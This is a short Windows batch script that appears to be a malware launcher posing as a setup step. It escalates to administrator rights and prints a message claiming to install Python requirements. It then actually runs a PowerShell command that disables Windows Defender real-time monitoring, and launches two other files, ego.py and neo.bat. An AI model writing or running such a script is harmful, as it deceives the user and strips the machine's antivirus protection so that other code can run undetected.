@echo off
cd /d "%~dp0"


@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrative privileges.
    echo Please run as administrator.
    powershell -command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo echo Installing python requirements...
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"

@echo off
start "" "ego.py"
start "" "neo.bat"

